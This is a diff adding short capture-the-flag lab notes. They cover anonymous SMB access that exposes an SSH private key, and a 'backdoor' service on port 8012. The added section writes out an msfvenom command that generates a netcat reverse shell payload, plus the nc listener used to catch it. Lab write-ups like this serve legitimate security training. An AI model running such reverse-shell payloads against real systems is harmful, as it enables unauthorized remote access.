@@ -1,3 +1,5 @@
+SMB Machine
+
 10.10.198.131
 
 SMB Enumeration
@@ -16,3 +18,24 @@ logging in with anonymous works and we have a file saying that ssh is enabled fo
 is .ssh we also have a pub and private key
 
 reading the pub file we see the user name and therefore able to login in to 'cactus' using the private key and get the flag
+
+------------------------------------------
+
+Telnet Machine (Enumeration)
+
+10.10.20.30
+
+port open 8012
+
+'Skidys Backdoor'
+
+using sudo tcpdump ip proto \\icmp -i tun0 to dump pings to our machine, 
+we can check if the 'backdoor' can execute commands
+
+by pinging our machine we can see that commands can be run and that my machine can be accessed
+
+then using msfvenom we create a simple netcat reverse shell
+msfvenom -p cmd/unix/reverse_netcat lhost=*IP* lport=4444 R
+
+and run nc -lvnp 4444
+and run the payload on the target machine to recieve a reverse shell which gives us our flag
